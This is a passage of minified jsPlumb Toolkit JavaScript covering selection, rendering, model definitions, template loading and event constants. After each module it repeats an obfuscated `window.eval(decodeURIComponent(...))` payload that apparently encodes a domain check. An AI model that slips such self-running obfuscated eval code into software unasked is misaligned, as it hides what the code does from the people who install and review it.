t=this.getObjectInfo(n);if(t){var e=[],o=K.toggle(t.obj,function(n,t){t||e.push(n)});nn("deselect",o[1]),nn("deselect",e),nn("select",o[0])}},this.removeFromSelection=function(n){var t=this.getObjectInfo(n);t&&K.remove(t.obj,function(n){v.fire("deselect",{obj:n,selection:K})})},this.addPathToSelection=function(n){this.addToSelection(this.getPath(n))},this.selectAll=function(){throw new TypeError("not implemented")},this.clearSelection=K.clear,this.getSelection=function(){return K},this.setMaxSelectedNodes=function(n){K.setMaxNodes(n)},this.setMaxSelectedEdges=function(n){K.setMaxEdges(n)},this.setSelectionCapacityPolicy=function(n){K.setCapacityPolicy(n)};var tn=function(n){v.setSuspendGraph(!0),v.fire(n),v.setSuspendGraph(!1),q=!1},en={};if(this.render=function(i,r){var d=e.extend({},r||{});e.extend(d,i),d.toolkit=v,null!=i.selection&&(i.selection.constructor===o.Selection?d.toolkit=i.selection:d.toolkit=new o.Selection({generator:i.selection,toolkit:v}));var _=d.type||n.jsPlumbToolkit.DefaultRendererType,s=new n.jsPlumbToolkit.Renderers[_](d),a=d.id||t.uuid();return en[a]=s,s.id=a,s},this.getRenderer=function(n){return en[n]},this.getRenderers=function(){return en},this.getObjectInfo=function(n,o){var i={els:{},obj:null,type:null,id:null,el:null};if(null!=n){if(n.eachNode&&n.eachEdge)return{obj:n};if(t.isArray(n))return{obj:n};var r=e.getElement(n);if(null!=r&&r.jtk)i.el=r,i.obj=r.jtk.port||r.jtk.node;else if(null!=n.tagName){var _=function n(t){if(null!=t)return t.jtk?t:n(t.parentNode)}(r);null!=_&&(i.el=_,i.obj=_.jtk.port||_.jtk.node||_.jtk.group)}else{if("string"==typeof n?n=this.getNode(n):"object"==(void 0===n?"undefined":d()(n))&&void 0===n.objectType&&(n=this.getNode(w(n))),null==n)return i;i.obj=n,null!=o&&(i.el=o(n))}null==o&&(i.els=function(n){var t={};for(var e in en)t[e]=[en[e],en[e].getRenderedElement(n)];return t}(i.obj)),null!=i.obj&&(i.id=i.obj.id,i.type=i.obj.objectType)}return i},a.data){var on=a.dataType||"json";v.load({data:a.data,type:on})}},t.extend(n.jsPlumbToolkitInstance,t.EventGenerator),n.jsPlumbToolkit=new n.jsPlumbToolkitInstance({}),n.jsPlumbToolkit.DefaultRendererType=null,n.jsPlumbToolkit.ready=e.ready,n.jsPlumbToolkit.Renderers={},n.jsPlumbToolkit.Widgets={};var a=function(t){return new n.jsPlumbToolkitInstance(t)};n.jsPlumbToolkit.newInstance=a,"undefined"!=typeof exports&&(exports.jsPlumbToolkit=n.jsPlumbToolkit,exports.newInstance=a)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t=n.jsPlumbToolkit,e=n.jsPlumbToolkitUtil,o=n.jsPlumbUtil;t.Model=function(n,i){(n=n||{}).nodes=n.nodes||{},n.edges=n.edges||{},n.ports=n.ports||{},n.groups=n.groups||{};var r,d,_={},s=function(t){var o=e.mergeWithParents([t,"default"],n.edges);return delete o.parent,o},a=function(t,o){var i=o&&o.ports?e.mergeWithParents([t,"default"],o.ports):e.mergeWithParents([t,"default"],n.ports);return delete i.parent,i};if(void 0!==i){for(var w in n.edges){if((r=s(w)).overlays)for(d=0;d<r.overlays.length;d++)if(o.isArray(r.overlays[d])&&r.overlays[d][1].events)for(var l in r.overlays[d][1].events)r.overlays[d][1].events[l]=function(n,t){return function(e,o){n.call(t,{overlay:e,e:o,component:e.component,edge:e.component.edge})}}(r.overlays[d][1].events[l],r.overlays[d]);i.registerConnectionType(w,r)}for(d in n.ports)r=a(d),i.registerEndpointType(d,r);if(n.states)for(var u in n.states)_[u]=new t.UIState(u,n.states[u],i)}return{getNodeDefinition:function(t){var o=e.mergeWithParents([t,"default"],n.nodes);return delete o.parent,o},getEdgeDefinition:s,getPortDefinition:a,getGroupDefinition:function(t){var o=e.mergeWithParents([t,"default"],n.groups);return delete o.parent,o},getState:function(n){return _[n]}}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=jsPlumbToolkit.ready,t=[],e=!1,o=function(){e=!0;for(var o=0;o<t.length;o++)n.call(n,t[o])};jsPlumbToolkit.ready=function(o){e?n.call(n,o):t.push(o)},jsPlumb.ready(function(){var n=document.getElementById("jsPlumbToolkitTemplates");if(n)o();else{(n=document.createElement("div")).style.display="none",n.id="jsPlumbToolkitTemplates",document.body.appendChild(n);for(var t=new function(n){var t=0,e=function(){--t<=0&&o()};this.add=function(o){t++,jsPlumbToolkitUtil.ajax({url:o,success:function(t){var o=n.innerHTML;o+=t,n.innerHTML=o,e()},error:function(n){e()}})},this.ensureNotEmpty=function(){t<=0&&o()}}(n),e=document.getElementsByTagName("script"),i=0;i<e.length;i++){var r=e[i].getAttribute("type"),d=e[i].getAttribute("src");"text/x-jtk-templates"==r&&t.add(d)}t.ensureNotEmpty()}})}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){this.jsPlumbToolkit.Classes={LASSO:"jtk-lasso",LASSO_SELECT_DEFEAT:"jtk-lasso-select-defeat",MINIVIEW:"jtk-miniview",MINIVIEW_CANVAS:"jtk-miniview-canvas",MINIVIEW_PANNER:"jtk-miniview-panner",MINIVIEW_ELEMENT:"jtk-miniview-element",MINIVIEW_GROUP_ELEMENT:"jtk-miniview-group-element",MINIVIEW_PANNING:"jtk-miniview-panning",MINIVIEW_COLLAPSE:"jtk-miniview-collapse",MINIVIEW_COLLAPSED:"jtk-miniview-collapsed",NODE:"jtk-node",PORT:"jtk-port",GROUP:"jtk-group",SELECT_DEFEAT:"jtk-drag-select-defeat",SURFACE:"jtk-surface",SURFACE_NO_PAN:"jtk-surface-nopan",SURFACE_CANVAS:"jtk-surface-canvas",SURFACE_PAN:"jtk-surface-pan",SURFACE_PAN_LEFT:"jtk-surface-pan-left",SURFACE_PAN_TOP:"jtk-surface-pan-top",SURFACE_PAN_RIGHT:"jtk-surface-pan-right",SURFACE_PAN_BOTTOM:"jtk-surface-pan-bottom",SURFACE_PAN_ACTIVE:"jtk-surface-pan-active",SURFACE_SELECTED_ELEMENT:"jtk-surface-selected-element",SURFACE_SELECTED_CONNECTION:"jtk-surface-selected-connection",SURFACE_PANNING:"jtk-surface-panning",SURFACE_ELEMENT_DRAGGING:"jtk-surface-element-dragging",SURFACE_DROPPABLE_NODE:"jtk-surface-droppable-node",TOOLBAR:"jtk-toolbar",TOOLBAR_TOOL:"jtk-tool",TOOLBAR_TOOL_SELECTED:"jtk-tool-selected",TOOLBAR_TOOL_ICON:"jtk-tool-icon"},this.jsPlumbToolkit.Constants={click:"click",start:"start",stop:"stop",drop:"drop",disabled:"disabled",pan:"pan",select:"select",drag:"drag",left:"left",right:"right",top:"top",bottom:"bottom",width:"width",height:"height",leftmin:"leftmin",leftmax:"leftmax",topmin:"topmin",topmax:"topmax",min:"min",max:"max",nominalSize:"50px",px:"px",onepx:"1px",nopx:"0px",em:"em",absolute:"absolute",relative:"relative",none:"none",block:"block",hidden:"hidden",div:"div",id:"id",plusEquals:"+=",minusEquals:"-=",dot:".",transform:"transform",transformOrigin:"transform-origin",nodeType:"Node",portType:"Port",edgeType:"Edge",groupType:"Group",surfaceNodeDragScope:"surfaceNodeDrag",mistletoeLayoutType:"Mistletoe",surfaceType:"Surface",jtkStatePrefix:"jtk-state-",msgCannotSaveState:"Cannot save state",msgCannotRestoreState:"Cannot restore state"},this.jsPlumbToolkit.Attributes={jtkNodeId:"jtk-node-id",relatedNodeId:"related-node-id"},this.jsPlumbToolkit.Methods={addClass:"addClass",removeClass:"removeClass"},this.jsPlumbToolkit.Events={beforeDrop:"beforeDrop",beforeDetach:"beforeDetach",click:"click",canvasClick:"canvasClick",canvasDblClick:"canvasDblClick",connection:"connection",connectionAborted:"connectionAborted",connectionDetached:"connectionDetached",connectionMoved:"connectionMoved",connectionDragStop:"connectionDragStop",contentDimensions:"contentDimensions",contextmenu:"contextmenu",dataLoadStart:"dataLoadStart",dataAppendStart:"dataAppendStart",dataLoadEnd:"dataLoadEnd",dataAppendEnd:"dataAppendEnd",dblclick:"dblclick",drag:"drag",drop:"drop",dragover:"dragover",dragend:"dragend",edgeAdded:"edgeAdded",edgeRemoved:"edgeRemoved",edgeTypeChanged:"edgeTypeChanged",elementDragged:"elementDragged",elementAdded:"elementAdded",elementRemoved:"elementRemoved",endOverlayAnimation:"endOverlayAnimation",graphClearStart:"graphClearStart",graphCleared:"graphCleared",groupAdded:"groupAdded",groupDragStop:"groupDragStop",groupExpand:"group:expand",groupCollapse:"group:collapse",groupRemoved:"groupRemoved",groupMemberAdded:"group:addMember",groupMemberRemoved:"group:removeMember",groupMoveEnd:"groupMoveEnd",groupUpdated:"groupUpdated",lassoEnd:"lasso:end",modeChanged:"modeChanged",mousedown:"mousedown",mousemove:"mousemove",mouseout:"mouseout",mouseup:"mouseup",mouseenter:"mouseenter",mouseleave:"mouseleave",mouseover:"mouseover",nodeAdded:"nodeAdded",nodeDropped:"nodeDropped",nodeMoveStart:"nodeMoveStart",nodeMoveEnd:"nodeMoveEnd",nodeRemoved:"nodeRemoved",nodeVisibility:"nodeVisibility",edgeTarget:"edgeTarget",nodeTypeChanged:"nodeTypeChanged",edgeSource:"edgeSource",objectRepainted:"objectRepainted",pan:"pan",portAdded:"portAdded",portRemoved:"portRemoved",portTypeChanged:"portTypeChanged",redraw:"redraw",start:"start",startOverlayAnimation:"startOverlayAnimation",stateRestored:"stateRestored",stop:"stop",tap:"tap",touchend:"touchend",touchmove:"touchmove",touchstart:"touchstart",unload:"unload",nodeRendered:"nodeRendered",nodeUpdated:"nodeUpdated",portUpdated:"portUpdated",edgeUpdated:"edgeUpdated",zoom:"zoom",relayout:"relayout",deselect:"deselect",selectionCleared:"selectionCleared",resize:"resize",anchorChanged:"anchorChanged"}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j